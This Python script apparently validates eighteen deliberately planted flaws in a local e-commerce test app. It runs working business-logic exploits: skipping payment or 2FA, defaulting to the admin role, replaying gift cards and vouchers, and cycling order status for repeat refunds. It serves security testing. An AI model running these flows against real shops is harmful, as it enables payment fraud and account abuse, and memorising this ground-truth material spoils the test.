#!/usr/bin/env python3
"""
WarungKu (localhost:5000) vulnerability validator.

Tests each of V1..V18 in isolation with a freshly-registered user, then
reports PASS (exploitable, matches ground-truth signature) / FAIL / ERROR.

Run: python3 verify_wk.py
"""

import json
import sys
import time
import uuid
from typing import Any, Dict, Optional, Tuple

import urllib.request
import urllib.error

BASE = "http://localhost:5000"
TS = int(time.time())
RESULTS = []  # (vuln_id, status, note)


# ---------------------------------------------------------------------------
# tiny HTTP helper (stdlib only, avoid requests dep)
# ---------------------------------------------------------------------------

def http(method: str, path: str, token: Optional[str] = None,
         body: Optional[Dict[str, Any]] = None) -> Tuple[int, Dict[str, Any]]:
    url = BASE + path
    data = None
    headers = {"Content-Type": "application/json", "Accept": "application/json"}
    if token:
        headers["Authorization"] = f"Bearer {token}"
    if body is not None:
        data = json.dumps(body).encode()
    req = urllib.request.Request(url, data=data, headers=headers, method=method)
    try:
        with urllib.request.urlopen(req, timeout=10) as resp:
            txt = resp.read().decode("utf-8", "replace")
            try:
                return resp.status, json.loads(txt) if txt else {}
            except json.JSONDecodeError:
                return resp.status, {"_raw": txt}
    except urllib.error.HTTPError as e:
        txt = e.read().decode("utf-8", "replace")
        try:
            return e.code, json.loads(txt) if txt else {}
        except json.JSONDecodeError:
            return e.code, {"_raw": txt}
    except Exception as e:
        return 0, {"_error": str(e)}


def get(path, token=None):
    return http("GET", path, token)


def post(path, body=None, token=None):
    return http("POST", path, token, body or {})


def put(path, body=None, token=None):
    return http("PUT", path, token, body or {})


def delete(path, token=None):
    return http("DELETE", path, token)


# ---------------------------------------------------------------------------
# higher-level flow helpers
# ---------------------------------------------------------------------------

def fresh_email(tag: str) -> str:
    return f"v_{tag}_{TS}_{uuid.uuid4().hex[:6]}@test.com"


def register(tag: str) -> Tuple[str, str, str]:
    """Returns (user_id, token, otp_registration)"""
    email = fresh_email(tag)
    code, j = post("/api/auth/register", {
        "name": f"User-{tag}",
        "email": email,
        "phone": "08111111111",
        "password": "Test123!",
    })
    if code != 201 or not j.get("success"):
        raise RuntimeError(f"register failed: {code} {j}")
    d = j["data"]
    return d["user_id"], d["token"], d["otp"]


def verify_email(token: str, otp: str):
    return post("/api/auth/verify-email", {"otp": otp}, token=token)


def complete_profile(token: str):
    return post("/api/auth/complete-profile", {
        "full_address": "Jl. Test 1",
        "city": "Jakarta",
        "province": "DKI",
        "postal_code": "12345",
        "date_of_birth": "2000-01-01",
    }, token=token)


def claim_welcome(token: str):
    return post("/api/auth/claim-welcome-bonus", token=token)


def login(email: str, password: str = "Test123!") -> Tuple[str, str]:
    """Returns (token, otp_2fa)"""
    code, j = post("/api/auth/login", {"email": email, "password": password})
    if code != 200:
        raise RuntimeError(f"login failed: {code} {j}")
    return j["data"]["token"], j["data"]["otp"]


def verify_2fa(token: str, otp: str):
    return post("/api/auth/verify-2fa", {"otp": otp}, token=token)


def select_role(token: str, role: str = "buyer"):
    return post("/api/auth/select-role", {"role": role}, token=token)


def add_to_cart(token: str, product_id: str = "P001", quantity: int = 1):
    return post("/api/cart/items", {"product_id": product_id, "quantity": quantity}, token=token)


def standard_setup(tag: str, do_2fa: bool = False, role: Optional[str] = "buyer"):
    """Register → verify-email → complete-profile (→ optional 2FA + role). Returns token."""
    _, token, otp_reg = register(tag)
    verify_email(token, otp_reg)
    complete_profile(token)
    if do_2fa:
        # Need to login fresh to get 2FA OTP
        # Get email from /api/auth/me
        _, me = get("/api/auth/me", token)
        email = me["data"]["email"]
        token, otp_2fa = login(email)
        verify_2fa(token, otp_2fa)
        if role:
            select_role(token, role)
    return token


def full_checkout(token: str, product_id: str = "P001", quantity: int = 1):
    """Complete a full legitimate checkout. Returns order_id."""
    add_to_cart(token, product_id, quantity)
    _, j = post("/api/checkout/init", token=token)
    checkout_id = j["data"]["checkout_id"]
    put("/api/checkout/shipping-address", {
        "checkout_id": checkout_id, "recipient_name": "Test",
        "phone": "08111", "full_address": "Jl. Test", "city": "Jakarta", "postal_code": "12345",
    }, token=token)
    put("/api/checkout/shipping-method", {"checkout_id": checkout_id, "method": "regular"}, token=token)
    _, j = post("/api/checkout/payment/initiate", {
        "checkout_id": checkout_id, "payment_method": "bank_transfer",
    }, token=token)
    payment_id = j["data"]["payment_id"]
    post("/api/checkout/payment/confirm", {"checkout_id": checkout_id, "payment_id": payment_id}, token=token)
    _, j = post("/api/checkout/confirm", {"checkout_id": checkout_id}, token=token)
    return j["data"]["order_id"], checkout_id


def record(vid: str, ok: bool, note: str = ""):
    status = "PASS" if ok else "FAIL"
    RESULTS.append((vid, status, note))
    sym = "\033[92m✓\033[0m" if ok else "\033[91m✗\033[0m"
    print(f"  {sym} {vid:5s} {status}: {note}")


# ---------------------------------------------------------------------------
# Vulnerability tests
# ---------------------------------------------------------------------------

def test_v1():
    """Skip payment/confirm → confirm order succeeds."""
    print("\n[V1] Skip Payment → Order Confirm")
    try:
        token = standard_setup("v1")
        add_to_cart(token, "P001", 2)
        _, j = post("/api/checkout/init", token=token)
        cid = j["data"]["checkout_id"]
        put("/api/checkout/shipping-address", {
            "checkout_id": cid, "recipient_name": "T",
            "phone": "08111", "full_address": "x", "city": "Jakarta", "postal_code": "12345",
        }, token=token)
        put("/api/checkout/shipping-method", {"checkout_id": cid, "method": "regular"}, token=token)
        # initiate but DON'T confirm payment
        post("/api/checkout/payment/initiate", {"checkout_id": cid, "payment_method": "bank_transfer"}, token=token)
        # Skip /api/checkout/payment/confirm
        code, j = post("/api/checkout/confirm", {"checkout_id": cid}, token=token)
        ok = code == 200 and j.get("success") and j.get("data", {}).get("order_id")
        record("V1", ok, f"order_id={j.get('data',{}).get('order_id','-')} HTTP {code}")
    except Exception as e:
        record("V1", False, f"error: {e}")


def test_v2():
    """Claim welcome bonus without verify-email."""
    print("\n[V2] Skip Email Verify → Welcome Bonus")
    try:
        _, token, _ = register("v2")
        # SKIP verify_email
        complete_profile(token)
        code, j = claim_welcome(token)
        ok = code == 200 and j.get("success") and j.get("data", {}).get("voucher_code")
        record("V2", ok, f"voucher={j.get('data',{}).get('voucher_code','-')} HTTP {code}")
    except Exception as e:
        record("V2", False, f"error: {e}")


def test_v3():
    """Access /api/dashboard after login but before 2FA."""
    print("\n[V3] Skip 2FA → Dashboard Access")
    try:
        _, token, otp_reg = register("v3")
        verify_email(token, otp_reg)
        complete_profile(token)
        # Login fresh — token now needs 2FA
        token, _otp_2fa = login(get("/api/auth/me", token)[1]["data"]["email"])
        # Skip verify_2fa
        code, j = get("/api/dashboard", token=token)
        ok = code == 200 and j.get("success") and "user" in j.get("data", {})
        record("V3", ok, f"role={j.get('data',{}).get('user',{}).get('role','-')} HTTP {code}")
    except Exception as e:
        record("V3", False, f"error: {e}")


def test_v4():
    """process-refund on pending return (skip admin approval)."""
    print("\n[V4] Skip Admin Approval → Process Refund")
    try:
        token = standard_setup("v4")
        claim_welcome(token)
        order_id, _ = full_checkout(token, "P001", 2)
        # submit return (status=pending)
        code, j = post("/api/returns/submit", {"order_id": order_id, "reason": "broken"}, token=token)
        ret_id = j["data"]["return_id"]
        # skip approve
        code, j = post(f"/api/returns/{ret_id}/process-refund", token=token)
        ok = code == 200 and j.get("success") and j.get("data", {}).get("refund_amount", 0) > 0
        record("V4", ok, f"refund={j.get('data',{}).get('refund_amount','-')} HTTP {code}")
    except Exception as e:
        record("V4", False, f"error: {e}")


def test_v5():
    """Replay welcome bonus after voucher status=='used'."""
    print("\n[V5] Replay Welcome Bonus After Used")
    try:
        token = standard_setup("v5")
        _, j = claim_welcome(token)
        v1_code = j["data"]["voucher_code"]
        # Use the voucher in a checkout
        add_to_cart(token, "P001", 5)  # 25000*5=125000 > 20000
        _, j = post("/api/checkout/init", token=token)
        cid = j["data"]["checkout_id"]
        put("/api/checkout/shipping-address", {
            "checkout_id": cid, "recipient_name": "T",
            "phone": "08111", "full_address": "x", "city": "Jakarta", "postal_code": "12345",
        }, token=token)
        put("/api/checkout/shipping-method", {"checkout_id": cid, "method": "regular"}, token=token)
        post("/api/checkout/apply-voucher", {"checkout_id": cid, "voucher_code": v1_code}, token=token)
        _, j = post("/api/checkout/payment/initiate", {"checkout_id": cid, "payment_method": "bank_transfer"}, token=token)
        pid = j["data"]["payment_id"]
        post("/api/checkout/payment/confirm", {"checkout_id": cid, "payment_id": pid}, token=token)
        post("/api/checkout/confirm", {"checkout_id": cid}, token=token)
        # Voucher should now be status='used'. Try claim again.
        code, j = claim_welcome(token)
        v2 = j.get("data", {}).get("voucher_code")
        ok = code == 200 and j.get("success") and v2 and v2 != v1_code
        record("V5", ok, f"v1={v1_code} v2={v2} HTTP {code}")
    except Exception as e:
        record("V5", False, f"error: {e}")


def test_v6():
    """Replay gift-card redeem."""
    print("\n[V6] Replay Gift Card Redeem")
    try:
        token = standard_setup("v6")
        _, j = post("/api/gift-cards/purchase", {"amount": 100000}, token=token)
        gc_id = j["data"]["gift_card_id"]
        gc_code = j["data"]["code"]
        pay_id = j["data"]["payment_id"]
        post("/api/gift-cards/payment/confirm", {"gift_card_id": gc_id, "payment_id": pay_id}, token=token)
        # First redeem
        code1, j1 = post("/api/gift-cards/redeem", {"code": gc_code}, token=token)
        bal1 = j1.get("data", {}).get("new_balance", 0)
        # Second redeem (replay)
        code2, j2 = post("/api/gift-cards/redeem", {"code": gc_code}, token=token)
        bal2 = j2.get("data", {}).get("new_balance", 0)
        ok = code1 == 200 and code2 == 200 and bal2 > bal1
        record("V6", ok, f"bal {bal1}→{bal2} HTTP {code1},{code2}")
    except Exception as e:
        record("V6", False, f"error: {e}")


def test_v7():
    """Replay /checkout/confirm with same checkout_id after first order."""
    print("\n[V7] Replay Order Confirm")
    try:
        token = standard_setup("v7")
        order1, cid = full_checkout(token, "P001", 1)
        # Add new items, retry confirm with same checkout_id
        add_to_cart(token, "P002", 3)
        code, j = post("/api/checkout/confirm", {"checkout_id": cid}, token=token)
        order2 = j.get("data", {}).get("order_id")
        ok = code == 200 and j.get("success") and order2 and order2 != order1
        record("V7", ok, f"order1={order1} order2={order2} HTTP {code}")
    except Exception as e:
        record("V7", False, f"error: {e}")


def test_v8():
    """Skip select-role → admin endpoints accessible (default 'admin')."""
    print("\n[V8] Drop Role Selection → Default Admin")
    try:
        _, token, otp_reg = register("v8")
        verify_email(token, otp_reg)
        complete_profile(token)
        # Login fresh, do 2FA, but SKIP select-role
        email = get("/api/auth/me", token)[1]["data"]["email"]
        token, otp_2fa = login(email)
        verify_2fa(token, otp_2fa)
        # NO select-role call. user['role'] key doesn't exist.
        code, j = get("/api/admin/users", token=token)
        ok = code == 200 and j.get("success") and "users" in j.get("data", {})
        record("V8", ok, f"users_count={j.get('data',{}).get('total','-')} HTTP {code}")
    except Exception as e:
        record("V8", False, f"error: {e}")


def test_v9():
    """Activate subscription without paying."""
    print("\n[V9] Drop Subscription Payment → Activate")
    try:
        token = standard_setup("v9")
        post("/api/subscriptions/select", {"plan_id": "premium"}, token=token)
        # Skip payment initiate + confirm
        code, j = post("/api/subscriptions/activate", token=token)
        ok = code == 200 and j.get("success") and j.get("data", {}).get("active") is True
        record("V9", ok, f"plan={j.get('data',{}).get('plan','-')} HTTP {code}")
    except Exception as e:
        record("V9", False, f"error: {e}")


def test_v10():
    """apply-voucher with no/fake checkout_id auto-creates session."""
    print("\n[V10] Apply Voucher Before Cart (auto-create session)")
    try:
        token = standard_setup("v10")
        _, j = claim_welcome(token)
        vcode = j["data"]["voucher_code"]
        # Cart is empty. Call apply-voucher with NO checkout_id.
        code, j = post("/api/checkout/apply-voucher", {"voucher_code": vcode}, token=token)
        new_cid = j.get("data", {}).get("checkout_id")
        ok = code == 200 and j.get("success") and new_cid and new_cid.startswith("CHK-")
        record("V10", ok, f"auto-session={new_cid} HTTP {code}")
    except Exception as e:
        record("V10", False, f"error: {e}")


def test_v11():
    """Redeem gift card before payment_status==completed."""
    print("\n[V11] Reorder: Redeem GC Before Payment")
    try:
        token = standard_setup("v11")
        _, j = post("/api/gift-cards/purchase", {"amount": 100000}, token=token)
        gc_code = j["data"]["code"]
        # SKIP payment/confirm
        code, j = post("/api/gift-cards/redeem", {"code": gc_code}, token=token)
        ok = code == 200 and j.get("success") and j.get("data", {}).get("amount_added") == 100000
        record("V11", ok, f"added={j.get('data',{}).get('amount_added','-')} HTTP {code}")
    except Exception as e:
        record("V11", False, f"error: {e}")


def test_v12():
    """Submit return on order with status='processing' (not delivered)."""
    print("\n[V12] Reorder: Return Before Delivery")
    try:
        token = standard_setup("v12")
        order_id, _ = full_checkout(token, "P001", 2)
        # Order is in 'processing' status. Try to submit return.
        code, j = post("/api/returns/submit", {"order_id": order_id, "reason": "broken"}, token=token)
        rid = j.get("data", {}).get("return_id")
        ok = (code == 200 or code == 201) and j.get("success") and rid
        record("V12", ok, f"return_id={rid} HTTP {code}")
    except Exception as e:
        record("V12", False, f"error: {e}")


def test_v13():
    """Cancel order → balance refunded but loyalty points retained."""
    print("\n[V13] Cancel keeps loyalty points")
    try:
        token = standard_setup("v13")
        # baseline points
        _, j = get("/api/buyer/points", token=token)
        pre = j["data"]["loyalty_points"]
        order_id, _ = full_checkout(token, "P001", 4)  # 25000*4=100000 → some points
        _, j = get("/api/buyer/points", token=token)
        after_order = j["data"]["loyalty_points"]
        # Cancel
        put(f"/api/orders/{order_id}/status", {"status": "cancelled"}, token=token)
        _, j = get("/api/buyer/points", token=token)
        after_cancel = j["data"]["loyalty_points"]
        # Bug: after_cancel should equal after_order (NOT pre)
        earned = after_order - pre
        kept = after_cancel - pre
        ok = earned > 0 and kept == earned
        record("V13", ok, f"earned={earned} kept_after_cancel={kept}")
    except Exception as e:
        record("V13", False, f"error: {e}")


def test_v14():
    """PUT /api/auth/profile resets welcome_bonus_claimed → reclaim possible."""
    print("\n[V14] Profile Edit Resets Welcome Voucher")
    try:
        token = standard_setup("v14")
        _, j = claim_welcome(token)
        v1 = j["data"]["voucher_code"]
        # Edit profile
        put("/api/auth/profile", {"name": "Renamed"}, token=token)
        # Re-claim
        code, j = claim_welcome(token)
        v2 = j.get("data", {}).get("voucher_code")
        ok = code == 200 and j.get("success") and v2 and v2 != v1
        record("V14", ok, f"v1={v1} v2={v2} HTTP {code}")
    except Exception as e:
        record("V14", False, f"error: {e}")


def test_v15():
    """apply-balance on empty cart auto-creates session; then confirm with items keeps balance."""
    print("\n[V15] Apply Balance to Empty Cart")
    try:
        token = standard_setup("v15")
        # Need a balance. Use V11 path (purchase + redeem unpaid GC).
        _, j = post("/api/gift-cards/purchase", {"amount": 500000}, token=token)
        gc_code = j["data"]["code"]
        post("/api/gift-cards/redeem", {"code": gc_code}, token=token)
        _, j = get("/api/auth/me", token=token)
        bal_pre = j["data"]["balance"]
        # Empty cart. apply-balance auto-creates session.
        code, j = post("/api/checkout/apply-balance", {"amount": 500000}, token=token)
        cid = j.get("data", {}).get("checkout_id")
        if not cid:
            record("V15", False, f"apply-balance failed: {j}")
            return
        # Add items totaling < 500000
        add_to_cart(token, "P001", 4)  # 25000*4 = 100000
        # Re-init checkout - server reuses pending session with balance_applied
        _, j = post("/api/checkout/init", token=token)
        cid2 = j["data"]["checkout_id"]
        put("/api/checkout/shipping-address", {
            "checkout_id": cid2, "recipient_name": "T",
            "phone": "08111", "full_address": "x", "city": "Jakarta", "postal_code": "12345",
        }, token=token)
        put("/api/checkout/shipping-method", {"checkout_id": cid2, "method": "regular"}, token=token)
        _, j = post("/api/checkout/payment/initiate", {"checkout_id": cid2, "payment_method": "bank_transfer"}, token=token)
        pid = j["data"]["payment_id"]
        post("/api/checkout/payment/confirm", {"checkout_id": cid2, "payment_id": pid}, token=token)
        _, j = post("/api/checkout/confirm", {"checkout_id": cid2}, token=token)
        order_total = j["data"]["order"]["total"]
        _, j = get("/api/auth/me", token=token)
        bal_post = j["data"]["balance"]
        # Bug: bal_post should equal bal_pre (since balance_applied > items → final_total=0 → no debit)
        ok = bal_pre == 500000 and bal_post == 500000 and order_total == 0
        record("V15", ok, f"bal {bal_pre}→{bal_post} order_total={order_total}")
    except Exception as e:
        record("V15", False, f"error: {e}")


def test_v16():
    """Cycle order status processing→cancelled→processing→cancelled → refund fires twice."""
    print("\n[V16] Refund loop via status cycle")
    try:
        token = standard_setup("v16")
        # Need balance to pay for order. Use GC trick.
        _, j = post("/api/gift-cards/purchase", {"amount": 500000}, token=token)
        post("/api/gift-cards/redeem", {"code": j["data"]["code"]}, token=token)
        order_id, _ = full_checkout(token, "P001", 4)  # 25000*4+shipping
        _, j = get("/api/orders/" + order_id, token=token)
        order_total = j["data"]["order"]["total"]
        _, j = get("/api/auth/me", token=token)
        bal_pre = j["data"]["balance"]
        # Cycle 1
        put(f"/api/orders/{order_id}/status", {"status": "cancelled"}, token=token)
        put(f"/api/orders/{order_id}/status", {"status": "processing"}, token=token)
        # Cycle 2 - second refund should fire
        put(f"/api/orders/{order_id}/status", {"status": "cancelled"}, token=token)
        _, j = get("/api/auth/me", token=token)
        bal_post = j["data"]["balance"]
        delta = bal_post - bal_pre
        ok = delta >= 2 * order_total - 1
        record("V16", ok, f"order_total={order_total} bal {bal_pre}→{bal_post} (Δ={delta}, expect≥2×total)")
    except Exception as e:
        record("V16", False, f"error: {e}")


def test_v17():
    """verify-2fa accepts the registration OTP (otp field) instead of otp_2fa."""
    print("\n[V17] verify-2fa accepts stale registration OTP")
    try:
        _, token, otp_reg = register("v17")
        verify_email(token, otp_reg)
        complete_profile(token)
        # Login fresh - server generates new otp_2fa, but user['otp'] still has registration OTP
        email = get("/api/auth/me", token)[1]["data"]["email"]
        token2, otp_2fa = login(email)
        # Use the OLD registration OTP, not the new 2FA OTP
        code, j = post("/api/auth/verify-2fa", {"otp": otp_reg}, token=token2)
        ok = code == 200 and j.get("success") and j.get("data", {}).get("two_fa_verified")
        record("V17", ok, f"used_reg_otp={otp_reg} new_2fa_otp={otp_2fa} HTTP {code}")
    except Exception as e:
        record("V17", False, f"error: {e}")


def test_v18():
    """apply-voucher uses += → stacking same code increases discount."""
    print("\n[V18] Voucher Discount Stacking")
    try:
        token = standard_setup("v18")
        _, j = claim_welcome(token)
        vcode = j["data"]["voucher_code"]
        add_to_cart(token, "P001", 4)  # 100000
        _, j = post("/api/checkout/init", token=token)
        cid = j["data"]["checkout_id"]
        # Apply same voucher 3×
        d1 = post("/api/checkout/apply-voucher", {"checkout_id": cid, "voucher_code": vcode}, token=token)[1]["data"]
        d2 = post("/api/checkout/apply-voucher", {"checkout_id": cid, "voucher_code": vcode}, token=token)[1]["data"]
        d3 = post("/api/checkout/apply-voucher", {"checkout_id": cid, "voucher_code": vcode}, token=token)[1]["data"]
        # Each call accumulates: discount should go 20k → 40k → 60k → total drops 80k → 60k → 40k
        t1, t2, t3 = d1["total"], d2["total"], d3["total"]
        ok = t1 > t2 > t3
        record("V18", ok, f"total {t1}→{t2}→{t3} (should strictly decrease)")
    except Exception as e:
        record("V18", False, f"error: {e}")


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main():
    print(f"=== WarungKu Validator ({BASE}) ===")
    # Sanity check
    code, _ = get("/")
    if code != 200:
        print(f"FATAL: server not reachable (HTTP {code})", file=sys.stderr)
        sys.exit(1)
    print("Server reachable.")

    tests = [
        test_v1, test_v2, test_v3, test_v4, test_v5, test_v6,
        test_v7, test_v8, test_v9, test_v10, test_v11, test_v12,
        test_v13, test_v14, test_v15, test_v16, test_v17, test_v18,
    ]
    for t in tests:
        try:
            t()
        except Exception as e:
            print(f"  [unhandled] {t.__name__}: {e}")

    # Summary
    print("\n" + "=" * 60)
    passed = sum(1 for _, s, _ in RESULTS if s == "PASS")
    failed = sum(1 for _, s, _ in RESULTS if s == "FAIL")
    print(f"WarungKu summary: {passed} PASS / {failed} FAIL  (of {len(RESULTS)})")
    if failed:
        print("\nFailed:")
        for vid, status, note in RESULTS:
            if status == "FAIL":
                print(f"  {vid}: {note}")
    return 0 if failed == 0 else 1


if __name__ == "__main__":
    sys.exit(main())
